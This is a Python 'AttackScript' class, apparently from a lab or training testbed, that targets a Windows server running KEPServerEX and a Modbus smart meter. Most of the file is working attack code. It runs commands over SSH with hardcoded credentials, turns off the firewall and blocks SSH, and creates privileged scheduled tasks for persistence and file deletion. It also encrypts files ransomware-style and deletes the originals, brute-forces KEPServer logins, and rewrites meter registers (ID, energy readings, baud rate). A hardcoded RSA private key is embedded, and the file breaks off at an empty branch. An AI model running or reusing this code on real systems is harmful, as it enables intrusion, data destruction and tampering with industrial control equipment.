from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
from psutil import process_iter
import signal
import base64
from pathlib import Path
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
#import ctypes
from sys import executable, argv
#from win32netcon import ACCESS_ALL
#from win32net import NetShareAdd
from time import sleep
#from win32console import GetConsoleWindow
#from win32gui import ShowWindow
import kepconfig
import pkgutil
from kepconfig import connection, admin, connectivity, datalogger
import json
import sys
# from Powershell.callPowerShell import runPowerShellScript
import paramiko
from scp import SCPClient
import socket
import platform

class AttackScript:
    def __init__(self, ip, username = "Student", password = "Student12345@"):
        #############
        # CONSTANTS #
        #############
        # Default credentials for windows server. 
        self.USERNAME = username
        self.PASSWORD = password
        self.WINDOWS_SERVER_IP = ip

        # Set the path for the password brute force file
        self.PASSWORD_FILE = "resources\\rockyou.txt"

        # Set the path for vulnerable sshd_config file and the access key
        self.SSHD_CONFIG_PATH="resources\\vuln_sshd_config"
        self.ACCESS_KEY_PATH="resources\\accessKey.pub"

        # Set the path for the private SSH key
        self.PRIVATE_KEY_PATH = "resources\\accessKey"

        # Set the path for the shared directory
        self.COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"

        # Set the path for the Smart Meter folder
        self.SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"

        # Path for the Modpoll
        # TODO: Either a modpoll path finder or make a modpoll unpacker
        # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
        self.MODPOLL_PATH = "C:\\Users\\Student"


###########
# ATTACKS #
###########

    # Check if the script is running with administrator privileges, if not, restart with elevated privileges
    # def check_admin() -> None:
    #     """
    #     Check if script is running wit admin privilege. Else, restart as admin.
    #     """
    #     try:
    #         isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
    #     except AttributeError:
    #         isAdmin = False
    #     if not isAdmin:
    #         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

    def ssh_run_command(self, command: str) -> str:
        """
        Runs a SINGLE command through ssh remotely and grab the output.

        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file

        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.

        Args:
            command (str): The command to run on the remote server.
            host (str): The hostname or IP address of the remote server.
            username (str): The username to use for the SSH connection.
            password (str): The password to use for the SSH connection.
            private_key_path (str): The path to the private key file.

        Returns:
            str: The output of the command.
        """

        ssh_output: str = "" # Declare as string to prevent error proning

        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the remote server, prioritizing private key over password
            if self.PRIVATE_KEY_PATH is not None:
                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
                # Connect using the private key
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
            if self.PASSWORD is not None:
                # Connect using password
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
            else:
                # Handle case when neither password nor private key is provided
                print("Please provide either a password or a private key.")
                return None

            # Placeholder for other code to run after successful connection
            print("Connected to the remote server.")
            # Run the command
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
            ssh_output_list = ssh_stdout.readlines()
            for line_no, line in enumerate(ssh_output_list):
                ssh_output_list[line_no] = line.replace("\r\n", "\n")
            ssh_output = "".join(ssh_output_list)

        except paramiko.AuthenticationException:
            print("Authentication failed. Please check your credentials.")
            return None
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
            return None
        except Exception as e:
            print(f"An error occurred: {e}")
            return None
        ssh.close()
        # Return the output
        return ssh_output

    def scheduled_task_delete_files(self, folder_path) -> None:
        """
        # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
        
        Delete the smartmeter path prediodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
        
        Args:
            folder_path (str):
        """
        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]

        # If the thing is ran locally
        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
            for root, dirs, files in walk(folder_path):
                for file in files:
                    og = path.join(root, file)
                    dest = path.join(self.COPIED_PATH, file)
                    remove(og)
                    print("File: " + str(og) + " is deleted")
        
        # Remotely transfer the exe and run attack 1, which will then run locally
        else:
            check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")

            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
                # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
                if platform.system() != "Windows":
                    raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
                self.transfer_exe_remotely()

            executable_file_path = f"{self.MODPOLL_PATH}/{path.basename(__file__).rsplit('.', 1)[0]}.exe" 

            executable_file_parameters = '1'

            task_name1 = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            # TODO: Run a native command prompt with task scheduler without cmd window appearing
            # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete

            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
            # TODO: Test if the task scheduler works.
            command_output_1 = self.ssh_run_command(sch1)
            command_output_2 = self.ssh_run_command(sch2)
            print(command_output_1); print(command_output_2)
            print("\nOk.\n")



    def create_scheduled_task(self) -> None:
        """
        Creates scheduled task in windows to execute the AttackScript.exe every minute.

        # TODO: Add comments on how frequent the schtasks run.
        # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is useless.
        # TODO: Self pyinstaller itself and then unpack the exe remotely and run itself with task scheduler.
        """
        try:
            executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'

            executable_file_parameters = '1'

            task_name1 = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'

            # TODO: Test if the task scheduler works.
            command_output_1 = self.ssh_run_command(sch1)
            command_output_2 = self.ssh_run_command(sch2)
            print(command_output_1); print(command_output_2)
            print("\nOk.\n")
        except Exception as e:
            print(e)
            print("\nFail.\n")

    # Copy files from a folder to the shared directory
    def copy_file(self,folder_path):
        try:
            for root, dirs, files in walk(folder_path):
                for file in files:
                    og = path.join(root, file)
                    dest = path.join(self.COPIED_PATH, file)
                    copyfile(og,dest)
                    print("File: " + str(og) + " is copied")
            print("\nOk.\n")
        except Exception as e:
            print("\nFail.\n")

    #Create Shared Folder
    # def create_shared_folder():
    #     try:
    #         folder_path = r'C:\Windows\temp\Smartmeter'

    #         # Create the folder if it does not already exist
    #         if not path.exists(folder_path):
    #             mkdir(folder_path)

    #         netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
    #         if "SmartMeterfolder" in netshare.stdout:
    #             print ("SmartMeterfolder has already been shared.")
    #         else:
    #             # Set the share information
    #             share_name = 'SmartMeterfolder'
    #             share_path = folder_path
    #             share_remark = 'Shared folder for full access'

    #             # Create the share
    #             share_info = {
    #                 'netname': share_name,
    #                 'path': share_path,
    #                 'remark': share_remark,
    #                 'max_uses': -1,
    #                 'current_uses': 0,
    #                 'permissions': ACCESS_ALL,
    #                 'security_descriptor': None
    #             }
    #             NetShareAdd(None, 2, share_info)
    #             print ("SmartMeterfolder has been shared.")
    #     except Exception as e:
    #         print("\nFail.\n")

    def disable_firewall(self) -> None:
        """
        Turn off all three domains of the firewall
        """
        #cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
        command_output = self.ssh_run_command("netsh advfirewall set allprofiles state off")

        if "Ok." in command_output:
            print("Firewall disabled successfully\nOk.\n")
        else:
            print("Firewall failed to disable\nFail.\n")

    def disable_ssh(self) -> None:
        """
        Disable SSH from the firewall
        """
        count = 0
        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
        else:
            print("Inbound Firewall Failed to be Inserted")

        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
        else:
            print("Inbound Firewall Failed to be Inserted")

        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
        else:
            print("Outbound Firewall Failed to be Inserted")
            
        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
        else:
            print("Outbound Firewall Failed to be Inserted")

        service_name = "sshd"
        command_output = self.ssh_run_command(f"sc stop {service_name}")

        if "FAILED" in command_output:
            print(f"FAILED: {command_output}")
        else:
            print(f"sshd service stopped")
            count += 1

        if count > 4:
            print("SSH Disabled successfully.\nOk.\n")
        else:
            print("SSH Failed to Disable.\nFail.\n")

    def run_modinterrupt(self) -> None:
        """
        Run modpoll to interrupt COM1 port by disabling KEP Server and then run modpoll indefenitely
        """
        self.kep_server_stop()

        baudrate = self.baudrate_check()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        parameters = ["-1", "-b", baudrate, '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
        
        check_modpoll = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")

        if "Polling" in check_modpoll:
            print("Modinterrupt is running \nOk.\n")
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
            try:
                self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
            except CalledProcessError as e:
                print("Error executing the executable file:", e)
        else:
            print("Modinterrupt is not running. \n Fail.\n")

    def disable_COMPort(self) -> None:
        """
        Disable a COM port
        # TODO: Add Exception handling
        """

        self.kep_server_stop()

        checkCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /enum-devices /class Ports')
        dump = checkCOM.split()
        deviceID = ""
        for i in range(0, len(dump)):
            if dump[i] == "ID:":
                    deviceID = dump[i+1]
                    if "CVBCx196117" in deviceID:
                            comPort = deviceID
                            print(comPort)

        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /disable-device "{comPort}"')
        if "successfully" in disableCOM:
            print(disableCOM)
            self.kep_server_start()
        else:
            print(disableCOM)
            print("Device not disabled. \nFail.\n")

    def encrypt_files(self) -> None:
        #public key
        pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
        pubKey = base64.b64decode(pubKey)

        #exclude extensions
        excludeExtension = ['.py','.pem', '.exe']
        try:
            for item in self.recurseFiles(self.SMARTMETER_PATH): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                self.encrypt(filePath, pubKey)
                print("Encrypted: " + str(filePath))

            print("Encryption Successful.\nOk.\n")
        except Exception as e:
            print("Encryption Failed.\nFail.\n")

    def encrypt(self,dataFile: Path, publicKey: bytes) -> None:
        '''
        <Insert description here>
        NOTE: use EAX mode to allow detection of unauthorized modifications

        Args:
            dataFile (pathlib.Path): path to file to encrypt
            publicKey (bytes): The public key

        Returns:
            None: Encrypted file with extension .L0v3sh3 and remove original file
        '''
        # read data from file
        extension = dataFile.suffix.lower()
        dataFile = str(dataFile)
        with open(dataFile, 'rb') as f:
            data = f.read()
        
        # convert data to bytes
        data = bytes(data)

        # create public key object
        key = RSA.import_key(publicKey)
        sessionKey = urandom(16)

        # encrypt the session key with the public key
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        # encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        # save the encrypted data to file
        fileName = dataFile.split(extension)[0]
        fileExtension = '.encrypted'
        encryptedFile = fileName + fileExtension
        with open(encryptedFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        remove(dataFile)


    def recurseFiles(self,baseDirectory):
        #Scan a directory and return a list of all files
        for entry in scandir(baseDirectory):
            if entry.is_file():
                yield entry
            else:
                yield from self.recurseFiles(entry.path)

    def decrypt(self,dataFile: Path, privatekey: bytes) -> None:
        """
        NOTE: use EAX mode to allow detection of unauthorized modifications

        Args:
            dataFile (pathlib.Path): path to file to encrypt
            privatekey (bytes): The private key
        """

        key = RSA.import_key(privatekey)

        # read data from file
        with open(dataFile, 'rb') as f:
            # read the session key
            encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
        try:
            # decrypt the session key
            cipher = PKCS1_OAEP.new(key)
            sessionKey = cipher.decrypt(encryptedSessionKey)

            # decrypt the data with the session key
            cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)

            # save the decrypted data to file
            [ fileName, fileExtension ] = str(dataFile).split('.')
            decryptedFile = fileName + '_decrypted.csv'
            with open(decryptedFile, 'wb') as f:
                f.write(data)

            print('Decrypted file saved to ' + decryptedFile)
        except Exception as e:
            print("File have not been encrypted.")

    #Run modpoll to change register 40201 to 26
    def change_meterID(self) -> None:
        """
        Run modpoll to change register 40201 (Which handle the meter ID) to 26
        """
        self.kep_server_stop()
        
        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]

        # FIXME: Try except for running the executable is gone
        print(self.ssh_run_command(f"{executable_path} {' '.join(parameters)}"))
        self.kep_server_start()

        print("\nOk.\n")


    def clear_energy_reading(self) -> None:
        """
        TL:DR Run modpoll to clear energy reading.
        
        In full, Register 40253 clears the energy reading when writing the value "78" to it. This clears the energy reading found in address 40026
        """
        self.kep_server_stop()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
        check_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
        clear_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
        
        # FIXME: Try except for running the executable is gone
        print(self.ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))
        print(self.ssh_run_command(f"{executable_path} {' '.join(clear_energy)}"))
        print(self.ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))

        print("Energy Reading Cleared.")

        self.kep_server_start()

        print("\nOk.\n")

    def kep_bruteforce(self) -> None:
        """
        Bruteforces the usernames and passwords of the KEP Server.
        """

        self.kep_server_start()

        usernames = ["Admin", "Administrator"]
        passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
        success = 0

        for username in usernames:
            for password in passwords:
                print("Trying Username: " + username +", Trying Password: " + password)
                # Read and print each line in the file
                # BUG: Why open KEPServerProperties? And also need to keep the kepserverproperties log somewhere, not in the local server.
                try:
                    server = kepconfig.connection.server(host = self.WINDOWS_SERVER_IP, port = 57412, user = username, pw = password)
                    output = server.get_project_properties()
                    with open(self.COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
                        f.write(str(output))
                    print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
                    success = 1
                    break
                except Exception as e:
                    print("Failed.\n")
                    continue

        if success == 0:
            print("\nFail.")

    def baudrate_change(self) -> None:
        """
        Run modpoll to change baud rate - Register 40206
        """
        self.kep_server_stop()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        # Call baudrate_check to determine current baudrate
        current_baudrate = self.baudrate_check()
        print(f"Current BaudRate:{current_baudrate}", file=sys.stdout)

        # Use current_baudrate value to set the new baudrate value in parameters list
        new_baudrate = None
        identifyBR = None
        if current_baudrate == "4800":
            new_baudrate = "1"
            identifyBR = "9600"
        elif current_baudrate == "9600":
            new_baudrate = "2"
            identifyBR = "19200"
        elif current_baudrate == "19200":
            new_baudrate = "0"
            identifyBR = "4800"
        else:
            print("Error: Unknown baudrate", file=sys.stdout)
            return

        print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}", file=sys.stdout)

        parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
        
        self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
        self.kep_server_start()

    def baudrate_check(self) -> str:
        """
        Run modpoll to check the baudrate - Register 40206
        """
        self.kep_server_stop()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        found_baudrate: int = 0
        baudrate_list = ["4800", "9600", "19200"]

        for baudrate in baudrate_list:
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
            baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
            print(baudrate_output)
            print(f"Checking baudrate {baudrate}:")
        
            if "[206]:" in baudrate_output:
                print(f"Baudrate is {baudrate}\n")
                found_baudrate = baudrate
                break
            else:
                print(f"Baudrate is not {baudrate}\n")

        # NOTE: The kep_server_start() is removed as commands using this function will try to start KEPServer anyways
        print("\nOk.\n")

        return found_baudrate

    def smartmeter_get_hardware_info(self):
        self.kep_server_stop()

        executable_path = self.MODPOLL_PATH + "\\modpoll.exe"

        baudrate = self.baudrate_check()
        if baudrate in ["4800", "9600", "19200"]:
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")

            parameters[9] = "9006" # DPM33 Address for reading hardwareOutput
            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")

            # TODO: For "cannot be detected" stuff, raise an exception
            if "[9005]:" in firmwareOutput:
                firmware_index = firmwareOutput.index("[9005]:")
                print(f"Firmware version: {firmwareOutput[firmware_index + 1]}")
            else:
                print(f"Firmware version cannot be detected")

            if "[9006]:" in hardwareOutput:
                hardware_index = hardwareOutput.index("[9006]:")
                print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
            else:
                print(f"Hardware version cannot be detected")

            # TODO: Add try except 
            self.kep_server_start()
        
        else:
            # TODO: Add try except 
            self.kep_server_start()
            raise Exception("Unable to connect to the SmartMeter")

        return
            


    # TODO: REVERT THIS THING PAIN.
    def revert(self,revert_option):
        # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
        if revert_option == "1":
            cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
            if cp.stdout.decode('utf-8').strip() == "Ok.":
                print("Firewall enabled successfully.\nOk.\n")
            else:
                print("Firewall failed to enable.\nFail.\n")
            
        elif revert_option == "2":
            count = 0
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
            else:
                print("Inbound Firewall Not Removed (TCP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
            else:
                print("Inbound Firewall Not Removed (UDP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
            else:
                print("Outbound Firewall Not Removed (TCP/22)")
            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
            if "Ok." in cp.stdout.decode('utf-8'):
                count += 1
                print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
            else:
                print("Outbound Firewall Not Removed (UDP/22)")

            service_name = "sshd"
            cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                    print("FAILED: " + " ".join(output[4:]))
            else:
                print("The " + output[1] + " service is " + output[9])
                count += 1

            if count == 5:
                print("Revert Success.\nOk.\n")
            else:
                print("Revert Fail.\nFail.\n")
            
        elif revert_option == "3":

            process_name = "modpoll"
            pid = 0

            for proc in process_iter():
                if process_name in proc.name():
                    pid = proc.pid
                break
            if pid == 0:
                print("Modpoll not running.")
            else:
                kill(pid, signal.SIGTERM)
                print("Modpoll pid:", pid, "has stopped.")

            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
            else:
                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
            
        elif revert_option == "4":
            cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
            dump = cp.stdout.split()
            deviceID = ""
            deviceArr = []
            for i in range(0, len(dump)):
                if dump[i].decode("utf-8") == "ID:":
                    deviceID = dump[i+1].decode("utf-8")
                    if "CVBCx196117" in deviceID:
                        comPort = deviceID
            batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
            with open("script.bat", "w") as f:
                f.write(batchscript)
            cp = run(["script.bat"],stdout=PIPE ,shell=True)
            if "successfully" in cp.stdout.decode('utf-8'):
                print(cp.stdout.decode('utf-8') + "\nOk.\n")
            else:
                print("Device not enabled. \nFail.\n")
            remove("script.bat")

        elif revert_option == "5":
            privatekey = '''-----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
    -----END RSA PRIVATE KEY-----'''
        
            #exclude extensions
            excludeExtension = ['.py','.pem', '.exe']
            
            try:
                for item in self.recurseFiles(self.SMARTMETER_PATH): 
                    filePath = Path(item)
                    fileType = filePath.suffix.lower()

                    if fileType in excludeExtension:
                        continue
                    self.decrypt(filePath, privatekey)
                print("Decryption Successful.\nOk.\n")
            except Exception as e:
                print("Decryption Failed.\nFail.\n")

        elif revert_option == "6":

            netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
            if "RUNNING" in netshare.stdout:
                print("Kepserver is running, Stopping now.")
                service_name = "KEPServerEXV6"
                cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
                output = cp.stdout.decode('utf-8').strip().split()
                if "FAILED" in cp.stdout.decode('utf-8'):
                    print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
                else:
                    print("The " + output[1] + " service is " + output[9])
                    sleep(15)

            current_directory = getcwd()
            executable_path = current_directory + "\\modpoll.exe"
            parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
            try:
                check_call([executable_path] + parameters)
            except CalledProcessError as e:
                print("Error executing the executable file:", e)
                print("Fail.\n")

            service_name = "KEPServerEXV6"
            cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
            output = cp.stdout.decode('utf-8').strip().split()
            if "FAILED" in cp.stdout.decode('utf-8'):
                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
            else:
                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")

        elif revert_option == "7":
            process_name = "modpoll"
            pid = 0

            for proc in process_iter():
                if process_name in proc.name():
                    pid = proc.pid
                break
            if pid == 0:
                print("Modpoll not running.\nFail.\n")
            else:
                kill(pid, signal.SIGTERM)
                print("Modpoll pid:", pid, "has stopped. \nOk.\n")

        elif revert_option == "8":
            
            for root, dirs, files in walk(self.COPIED_PATH):
                for file in files:
                    og = path.join(root, file)
                    remove(og)
                    print("File: " + str(og) + " is deleted")

            if path.exists(self.COPIED_PATH):
                rmdir(self.COPIED_PATH)
                print(self.COPIED_PATH + " has beeen removed.")

            netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)

            task_name1 = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
            
                
            # Define the command to delete the task using schtasks
            schdel = f'schtasks /delete /tn "{task_name1}" /f'
            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'

            # Delete the task using the schtasks command
            call(schdel, shell=True)
            call(schdel2, shell=True)

            if "SmartMeterfolder" in netsharechk.stdout:
                call('cmd /k "net share SmartMeterfolder /delete"', shell=True)

            print("Ok.")

        elif revert_option == "9":

